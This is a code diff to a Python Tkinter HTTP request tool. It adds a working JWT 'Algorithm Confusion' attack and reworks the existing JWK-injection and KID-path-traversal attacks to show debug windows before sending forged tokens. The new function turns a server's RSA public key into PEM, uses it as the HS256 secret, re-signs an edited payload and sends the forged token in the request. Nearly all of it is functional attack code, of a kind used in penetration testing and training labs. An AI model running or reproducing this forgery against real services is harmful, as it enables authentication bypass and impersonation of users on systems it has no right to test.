@@ -488,6 +488,9 @@ class HTTPRequestTool:
         self.kid_traversal_var = tk.BooleanVar()
         ttk.Checkbutton(attack_frame, text="KID Header Path Traversal", variable=self.kid_traversal_var).pack(anchor=tk.W, pady=5)
         
+        self.algorithm_confusion_var = tk.BooleanVar()
+        ttk.Checkbutton(attack_frame, text="Algorithm Confusion", variable=self.algorithm_confusion_var).pack(anchor=tk.W, pady=5)
+        
         # Add button to manage secrets list
         ttk.Button(attack_frame, text="Manage Secrets List", command=self.manage_secrets_list).pack(pady=5)
         
@@ -546,6 +549,8 @@ class HTTPRequestTool:
             self.perform_jwk_injection_attack()
         if self.kid_traversal_var.get():
             self.perform_kid_traversal_attack()
+        if self.algorithm_confusion_var.get():
+            self.perform_algorithm_confusion_attack()
         attack_window.destroy()
 
     def perform_unverified_signature_attack(self):
@@ -869,23 +874,42 @@ class HTTPRequestTool:
                     # Send the modified request
                     self.request_text.delete("1.0", tk.END)
                     self.request_text.insert("1.0", modified_request)
-                    self.process_request()
                     
-                    # Get the response status code from the response text
-                    response_text = self.response_text.get("1.0", tk.END)
-                    status_line = response_text.split('\n')[0]
-                    try:
-                        status_code = int(status_line.split()[1])
-                    except (IndexError, ValueError):
-                        status_code = 0
+                    # Show debug information
+                    debug_info = f"""Modified Token:
+{modified_token}
+
+Header:
+{json.dumps(new_header, indent=2)}
+
+Payload:
+{json.dumps(edited_payload, indent=2)}"""
                     
-                    # Check if the status code indicates failure (400 or 500 series)
-                    if status_code >= 400:
-                        messagebox.showinfo("Attack Result", "JWK Header Injection Attack: ❌ FAILED")
-                    else:
-                        messagebox.showinfo("Attack Result", "JWK Header Injection Attack: ✅ SUCCESS")
+                    # Create debug window
+                    debug_window = tk.Toplevel(self.root)
+                    debug_window.title("Debug Information")
+                    debug_window.geometry("800x600")
                     
-                    edit_window.destroy()
+                    # Add text area for debug info
+                    debug_text = tk.Text(debug_window, wrap=tk.WORD)
+                    debug_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+                    
+                    # Add scrollbar
+                    scrollbar = ttk.Scrollbar(debug_text)
+                    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+                    debug_text.config(yscrollcommand=scrollbar.set)
+                    scrollbar.config(command=debug_text.yview)
+                    
+                    # Insert debug info
+                    debug_text.insert("1.0", debug_info)
+                    
+                    # Add continue button
+                    def continue_attack():
+                        debug_window.destroy()
+                        self.process_request()
+                    
+                    continue_button = ttk.Button(debug_window, text="Continue Attack", command=continue_attack)
+                    continue_button.pack(pady=10)
                     
                 except json.JSONDecodeError:
                     messagebox.showerror("Error", "Invalid JSON in payload. Please fix the JSON format.")
@@ -976,7 +1000,42 @@ class HTTPRequestTool:
                         # Send the modified request
                         self.request_text.delete("1.0", tk.END)
                         self.request_text.insert("1.0", modified_request)
-                        self.process_request()
+                        
+                        # Show debug information
+                        debug_info = f"""Modified Token:
+{modified_token}
+
+Header:
+{json.dumps(new_header, indent=2)}
+
+Payload:
+{json.dumps(edited_payload, indent=2)}"""
+                        
+                        # Create debug window
+                        debug_window = tk.Toplevel(self.root)
+                        debug_window.title("Debug Information")
+                        debug_window.geometry("800x600")
+                        
+                        # Add text area for debug info
+                        debug_text = tk.Text(debug_window, wrap=tk.WORD)
+                        debug_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+                        
+                        # Add scrollbar
+                        scrollbar = ttk.Scrollbar(debug_text)
+                        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+                        debug_text.config(yscrollcommand=scrollbar.set)
+                        scrollbar.config(command=debug_text.yview)
+                        
+                        # Insert debug info
+                        debug_text.insert("1.0", debug_info)
+                        
+                        # Add continue button
+                        def continue_attack():
+                            debug_window.destroy()
+                            self.process_request()
+                        
+                        continue_button = ttk.Button(debug_window, text="Continue Attack", command=continue_attack)
+                        continue_button.pack(pady=10)
                         
                         # Get the response status code from the response text
                         response_text = self.response_text.get("1.0", tk.END)
@@ -1011,6 +1070,211 @@ class HTTPRequestTool:
             
         except Exception as e:
             messagebox.showerror("Error", f"Failed to perform KID Header Path Traversal attack: {str(e)}")
+
+    def perform_algorithm_confusion_attack(self):
+        # Get the current request text
+        request_text = self.request_text.get("1.0", tk.END).strip()
+        
+        # Find JWT tokens in the request
+        jwt_tokens = self.find_jwt(request_text)
+        if not jwt_tokens:
+            messagebox.showerror("Error", "No JWT tokens found in request")
+            return
+        
+        # Get the first JWT token
+        original_token = jwt_tokens[0]
+        
+        try:
+            # Decode the JWT without verification
+            header = jwt.get_unverified_header(original_token)
+            payload = jwt.decode(original_token, options={"verify_signature": False})
+            
+            # Create a window for editing the payload and entering the public key
+            edit_window = tk.Toplevel(self.root)
+            edit_window.title("Algorithm Confusion Attack")
+            edit_window.geometry("800x600")
+            
+            # Create notebook for tabs
+            notebook = ttk.Notebook(edit_window)
+            notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+            
+            # Payload tab
+            payload_frame = ttk.Frame(notebook)
+            notebook.add(payload_frame, text="JWT Payload")
+            
+            payload_text = tk.Text(payload_frame, wrap=tk.WORD)
+            payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            
+            # Add scrollbar for payload
+            payload_scrollbar = ttk.Scrollbar(payload_text)
+            payload_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+            payload_text.config(yscrollcommand=payload_scrollbar.set)
+            payload_scrollbar.config(command=payload_text.yview)
+            
+            # Insert current payload
+            payload_text.insert("1.0", json.dumps(payload, indent=2))
+            
+            # Public key tab
+            key_frame = ttk.Frame(notebook)
+            notebook.add(key_frame, text="Public Key")
+            
+            # Add label and text area for public key
+            key_label = ttk.Label(key_frame, text="Enter the server's public key in JWK format:")
+            key_label.pack(pady=5)
+            
+            key_text = tk.Text(key_frame, wrap=tk.WORD, height=10)
+            key_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            
+            # Add scrollbar for key
+            key_scrollbar = ttk.Scrollbar(key_text)
+            key_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+            key_text.config(yscrollcommand=key_scrollbar.set)
+            key_scrollbar.config(command=key_text.yview)
+            
+            def continue_attack():
+                try:
+                    # Get edited payload
+                    edited_payload = json.loads(payload_text.get("1.0", tk.END).strip())
+                    
+                    # Get the public key from user input
+                    try:
+                        # Parse the input JWK
+                        input_jwk = json.loads(key_text.get("1.0", tk.END).strip())
+                        
+                        # Validate JWK format
+                        if not all(k in input_jwk for k in ['kty', 'e', 'n']):
+                            messagebox.showerror("Error", "Invalid JWK format. Must contain kty, e, and n fields.")
+                            return
+                        
+                        if input_jwk['kty'] != 'RSA':
+                            messagebox.showerror("Error", "Only RSA keys are supported for this attack.")
+                            return
+                        
+                        # Create properly formatted JWK set
+                        jwk = {
+                            "kty": input_jwk["kty"],
+                            "e": input_jwk["e"],
+                            "n": input_jwk["n"],
+                            "kid": input_jwk.get("kid", "")
+                        }
+                        
+                        # Get the raw n and e values from the JWK
+                        n = base64.urlsafe_b64decode(jwk['n'] + '=' * (-len(jwk['n']) % 4))
+                        e = base64.urlsafe_b64decode(jwk['e'] + '=' * (-len(jwk['e']) % 4))
+                        
+                        # Create RSA public key from n and e
+                        public_key = rsa.RSAPublicNumbers(
+                            int.from_bytes(e, byteorder='big'),
+                            int.from_bytes(n, byteorder='big')
+                        ).public_key(default_backend())
+                        
+                        # Convert to PEM format
+                        pem = public_key.public_bytes(
+                            encoding=serialization.Encoding.PEM,
+                            format=serialization.PublicFormat.SubjectPublicKeyInfo
+                        )
+                        
+                        # Base64 encode the PEM and remove newlines
+                        pem_base64 = base64.b64encode(pem).decode('utf-8').replace('\n', '')
+                        
+                        # Create the symmetric key JWK using the PEM-encoded key
+                        symmetric_jwk = {
+                            "kty": "oct",
+                            "kid": jwk.get('kid', ''),
+                            "k": pem_base64
+                        }
+                        
+                        # Create a new header with HS256 algorithm and the JWK
+                        new_header = {
+                            "alg": "HS256",
+                            "typ": "JWT",
+                            "jwk": symmetric_jwk
+                        }
+                        
+                        # Sign the token with the PEM-encoded key as the HMAC secret
+                        modified_token = jwt.encode(
+                            edited_payload,
+                            pem_base64,
+                            algorithm='HS256',
+                            headers=new_header
+                        )
+                        
+                        # Show debug information
+                        debug_info = f"""Modified Token:
+{modified_token}
+
+Header:
+{json.dumps(new_header, indent=2)}
+
+Payload:
+{json.dumps(edited_payload, indent=2)}
+
+Key Details:
+- Raw n length: {len(n)} bytes
+- Base64 n: {base64.urlsafe_b64encode(n).decode('utf-8').rstrip('=')}
+- Raw e length: {len(e)} bytes
+- Base64 e: {base64.urlsafe_b64encode(e).decode('utf-8').rstrip('=')}
+- PEM length: {len(pem)} bytes
+- Base64 PEM: {pem_base64}
+
+Attack Details:
+1. Converting RSA public key to PEM format
+2. Base64 encoding the PEM
+3. Using the PEM as the HMAC secret
+4. Setting algorithm to HS256 to trigger the confusion
+5. Preserving the kid from the original key"""
+                        
+                        # Create debug window
+                        debug_window = tk.Toplevel(self.root)
+                        debug_window.title("Debug Information")
+                        debug_window.geometry("800x600")
+                        
+                        # Add text area for debug info
+                        debug_text = tk.Text(debug_window, wrap=tk.WORD)
+                        debug_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+                        
+                        # Add scrollbar
+                        scrollbar = ttk.Scrollbar(debug_text)
+                        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+                        debug_text.config(yscrollcommand=scrollbar.set)
+                        scrollbar.config(command=debug_text.yview)
+                        
+                        # Insert debug info
+                        debug_text.insert("1.0", debug_info)
+                        
+                        # Add continue button
+                        def continue_attack():
+                            debug_window.destroy()
+                            # Replace the original token in the request
+                            modified_request = request_text.replace(original_token, modified_token)
+                            
+                            # Send the modified request
+                            self.request_text.delete("1.0", tk.END)
+                            self.request_text.insert("1.0", modified_request)
+                            self.process_request()
+                        
+                        continue_button = ttk.Button(debug_window, text="Continue Attack", command=continue_attack)
+                        continue_button.pack(pady=10)
+                    
+                    except json.JSONDecodeError:
+                        messagebox.showerror("Error", "Invalid JSON in public key. Please fix the JSON format.")
+                    except Exception as e:
+                        messagebox.showerror("Error", f"Failed to process public key: {str(e)}")
+                    
+                    edit_window.destroy()
+                    
+                except json.JSONDecodeError:
+                    messagebox.showerror("Error", "Invalid JSON in payload. Please fix the JSON format.")
+                except Exception as e:
+                    messagebox.showerror("Error", f"Failed to perform Algorithm Confusion attack: {str(e)}")
+                    edit_window.destroy()
+            
+            # Add continue button
+            continue_button = ttk.Button(edit_window, text="Continue Attack", command=continue_attack)
+            continue_button.pack(pady=10)
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to perform Algorithm Confusion attack: {str(e)}")
 
     def edit_jwt(self):
         # Get the current JWT content
